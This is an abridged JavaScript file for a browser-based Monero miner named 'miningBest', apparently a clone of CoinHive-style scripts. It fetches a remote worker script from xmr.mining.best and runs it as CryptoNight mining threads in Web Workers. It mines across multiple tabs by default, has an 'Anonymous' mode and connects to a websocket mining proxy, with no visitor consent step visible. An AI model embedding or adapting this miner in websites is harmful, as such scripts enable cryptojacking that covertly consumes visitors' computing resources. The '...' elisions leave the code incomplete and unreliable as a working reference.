(function (window) {
    ...
    var Miner = function (siteKey, params) {
        ...
        this._tab = {
            ...
            mode: miningBest.FORCE_MULTI_TAB,
            grace: 0,
            lastPingReceived: 0,
            interval: null
        };
        if (window.BroadcastChannel) {
            try {
                this._bc = new BroadcastChannel("miningBest");
    ...
    Miner.prototype.start = function (mode) {
        this._tab.mode = mode || miningBest.FORCE_MULTI_TAB;
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener("load", function () {
                miningBest.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", "https://xmr.mining.best/worker.js", true);
            xhr.send()
            ...
            xhr.open("get", miningBest.CONFIG.LIB_URL + "cryptonight-asmjs.min.js", true);
            xhr.send()
        }
    };
    Miner.prototype.verify = function (mode) {
        this._tab.mode = mode || miningBest.IF_EXCLUSIVE_TAB;
        if (this._tab.interval) {
            clearInterval(this._tab.interval);
            this._tab.interval = null
        }
    ...
    Miner.prototype.setThrottle = function (throttle) {
        ...
        console.log("this._throttle: " + this._throttle);
        if (this._currentJob) {
    ...
    Miner.prototype.setNumThreads = function (num) {
        ...
        if (num > this._threads.length) {
            for (var i = 0; num > this._threads.length; i++) {
                var thread = new miningBest.JobThread;
                if (this._currentJob) {
    ...
    Miner.prototype._startNow = function () {
        if (this._tab.mode !== miningBest.FORCE_MULTI_TAB && !this._tab.interval) {
            this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
        }
        if (this._tab.mode === miningBest.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return
        }
        if (this._tab.mode === miningBest.FORCE_EXCLUSIVE_TAB) {
            this._tab.grace = Date.now() + 3e3
        }
        if (!this.verifyThread) {
            this.verifyThread = new miningBest.JobThread
        }
        this.setNumThreads(this._targetNumThreads);
        this._autoReconnect = true;
        if (miningBest.CONFIG.REQUIRES_AUTH) {
            this._auth = this._auth || new miningBest.Auth(this._siteKey);
    ...
    Miner.prototype._otherTabRunning = function () {
        ...
        try {
            var tdjson = localStorage.getItem("miningBest");
            if (tdjson) {
    ...
    Miner.prototype._updateTabs = function () {
        ...
        if (this.isRunning()) {
            ...
            try {
                localStorage.setItem("miningBest", JSON.stringify({
    ...
    Miner.prototype._connect = function () {
        ...
        var shards = miningBest.CONFIG.WEBSOCKET_SHARDS;
    ...
    Miner.prototype._onMessage = function (ev) {
        ...
        if (msg.type === "job") {
            ...
            if (console && console.error) {
                console.error("miningBest Error:", msg.params.error)
            }
    ...
    window.miningBest = window.miningBest || {};
    window.miningBest.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    window.miningBest.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    window.miningBest.FORCE_MULTI_TAB = "forceMultiTab";
    window.miningBest.Token = function (siteKey, goal, params) {
        var miner = new Miner(siteKey, params);
        miner._goal = goal || 0;
        return miner
    };
    window.miningBest.User = function (siteKey, user, params) {
        var miner = new Miner(siteKey, params);
        miner._user = user;
        return miner
    };
    window.miningBest.Anonymous = function (siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner
    }
    window.miningBest.Go = function (siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner
    }      
    window.miningBest.Verify = function (siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner
    }    
})(window);
(function (window) {
    ...
    var JobThread = function () {
        this.worker = new Worker(miningBest.CRYPTONIGHT_WORKER_BLOB);
    ...
    window.miningBest.JobThread = JobThread
})(window);
self.miningBest = self.miningBest || {};
self.miningBest.CONFIG = {
    LIB_URL: "https://xmr.mining.best/lib/",
    WEBSOCKET_SHARDS: [["wss://xmr.mining.best/proxy"]],
    CAPTCHA_URL: "https://xmr.mining.best/captcha/",
    MINER_URL: "https://xmr.mining.best/media/miner.html"
};
